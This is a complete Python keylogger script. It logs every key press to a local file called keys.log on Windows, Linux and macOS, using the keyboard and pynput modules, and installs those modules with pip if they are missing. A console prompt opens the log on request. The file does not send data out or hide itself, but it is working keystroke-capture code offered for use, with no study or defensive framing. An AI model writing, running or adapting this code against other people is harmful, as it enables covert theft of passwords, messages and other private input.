import platform
import subprocess
import ctypes
import os
import threading

try:
    import keyboard
except ImportError:
    print("Some of the required modules failed to import. You will be prompted to install them.")

def check_modules():
    required_modules = ['keyboard', 'pynput']
    missing_modules = []
    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            missing_modules.append(module)
    if missing_modules:
        print(f"Required module(s) '{', '.join(missing_modules)}' is missing.")
        for install_command in ['pip install', 'python -m pip install', 'py -m pip install']:
            for module in missing_modules:
                cmd = f"{install_command} {module}"
                try:
                    result = subprocess.run(cmd.split(), check=False)
                    if result.returncode != 0:
                        print(f"Failed to install '{module}' using '{install_command}'.")
                    else:
                        print(f"Successfully installed '{module}' using '{install_command}'. Please restart the script.")
                        exit()
                except FileNotFoundError:
                    print(f"'{install_command}' command not found.")
                    continue  # Try the next command
        print("Failed to install required module(s). Please install them manually before running the script.")
        exit()

def keylogger():
    check_modules()
    system = platform.system()
    if system == 'Windows':
        keylogger_windows(ctypes)
    elif system == 'Linux':
        keylogger_linux()
    elif system == 'Darwin':  # macOS
        keylogger_macos()
    else:
        print("Unsupported operating system.")

def open_log_file():
    if os.name == 'nt':
        try:
            subprocess.Popen(['notepad', 'keys.log'])
        except FileNotFoundError:
            print("Notepad is not available on this system.")
    elif os.name == 'posix':
        try:
            subprocess.Popen(['xdg-open', 'keys.log'])
        except FileNotFoundError:
            print("Could not open the log file.")

def keylogger_windows(ctypes):
    def on_key_press(event):
        with open('keys.log', 'a') as f:
            f.write(f"{event.name}\n")

    # Create a keyboard listener
    keyboard.on_press(on_key_press)

    # Keep the script running to capture events
    keyboard.wait()

def keylogger_linux():
    import keyboard

    def on_key_press(event):
        with open('keys.log', 'a') as f:
            f.write(f"{event.name}\n")

    # Create a keyboard listener
    keyboard.on_press(on_key_press)

    # Keep the script running to capture events
    keyboard.wait()

def keylogger_macos():
    from pynput.keyboard import Listener

    def on_press(key):
        with open('keys.log', 'a') as f:
            f.write(f"{key}\n")

    # Create a keyboard listener
    with Listener(on_press=on_press) as listener:
        listener.join()

# Start the keylogger in a separate thread
keylogger_thread = threading.Thread(target=keylogger)
keylogger_thread.start()

# Check if the user typed "view" in the console
while True:
    user_input = input("Type 'view' to open the log file: ")
    if user_input.lower() == 'view':
        open_log_file()
